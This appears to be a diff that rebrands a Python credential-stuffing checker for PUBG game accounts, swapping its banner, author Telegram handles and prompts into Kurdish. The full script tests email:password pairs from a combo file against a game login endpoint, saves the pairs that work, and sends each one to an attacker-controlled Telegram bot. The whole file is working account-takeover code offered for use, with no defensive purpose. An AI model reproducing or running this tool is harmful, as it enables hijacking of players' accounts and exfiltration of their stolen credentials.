@@ -1,31 +1,32 @@
 import requests,hashlib,random,string,time
 r = requests.session()
 print("""
-┣━━━━━━━━━━━━━━━
-┃▒▒▒▒▒▒▒▒▒▒ 0% 
-┃▓▓▒▒▒▒▒▒▒▒ 20% 
-┃▓▓▓▓▓▒▒▒▒▒ 50% 
-┃▓▓▓▓▓▓▓▓▒▒ 80% 
-┃▓▓▓▓▓▓▓▓▓▓ 100%
 
-        ABDO ELGOKAR
-        https://t.me/Elgokar11
-    tele:    @Elgokar_1
+   ____   U  ___ u  __  __     ____     U  ___ u      ____      _   _    ____     ____   
+U /"___|   \/"_ \/U|' \/ '|uU | __")u    \/"_ \/    U|  _"\ uU |"|u| |U | __")uU /"___|u 
+\| | u     | | | |\| |\/| |/ \|  _ \/    | | | |    \| |_) |/ \| |\| | \|  _ \/\| |  _ / 
+ | |/__.-,_| |_| | | |  | |   | |_) |.-,_| |_| |     |  __/    | |_| |  | |_) | | |_| |  
+  \____|\_)-\___/  |_|  |_|   |____/  \_)-\___/      |_|      <<\___/   |____/   \____|  
+ _// \\      \\   <<,-,,-.   _|| \\_       \\        ||>>_   (__) )(   _|| \\_   _)(|_   
+(__)(__)    (__)   (./  \.) (__) (__)     (__)      (__)__)      (__) (__) (__) (__)__)  
+        Arez (Aro)
+        https://t.me/Arez_TEach
+        telegram:    @Ravo_m
 """)
-ID= input('[+] Enter YOUR ID : ')
-token = input('[+] Enter TOKEN BOT : ')
+ID= input('[+] ID Xot Bnusa : ')
+token = input('[+] Token Botakat bnusa : ')
 headPUB = {
 	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
 def CHECK(email,pess):
   eml = email
   pas = pess
   YES = f"""
-[true] Hacked PUBG :
+[true] Hack Buu :
 [true] Email: {eml}
 [true] Pass: {pas}
 ━━━━━━━━━━━━━"""
   NO = f"""
-[-] NOT Hacked PUBG :
+[-] Hack Nabuu :
 [-] Email: {eml}
 [-] Pass: {pas}
 ━━━━━━━━━━━━━"""
@@ -37,19 +38,19 @@ def CHECK(email,pess):
   GO=r.get(url, data=daPU,headers=headPUB).text
   if '"token"' in GO:
     print(YES)
-    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nمن صنع ABDO ELGOKAR @Elgokar_1 قناتي @Elgokar11')
+    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nسپاس بۆ بەكارھێنانی تۆڵەكە فەرموو ئەمە پۆپجیەكانە @arez_teach')
     with open('NWE-PUBG.txt', 'a') as x:
-      x.write(eml+':'+pas+' |@a_hme_26\n')
+      x.write(eml+':'+pas+' |@Ravo_m\n')
   else:
     print(NO)
 def FILname():
-  F = input('[+] Enter the name the combo file : ')
+  F = input('[+] Nawe Comboka Chya : ')
   try:
     for x in open(F,'r').read().splitlines():
       email = x.split(":")[0]
       pess = x.split(":")[1]
       CHECK(email,pess)
   except FileNotFoundError:
-    print('\n[-] The file name is incorrect !\n')
+    print('\n[-] Hech Comboyak nadozrayawa:) !\n')
     return FILname()
 FILname()
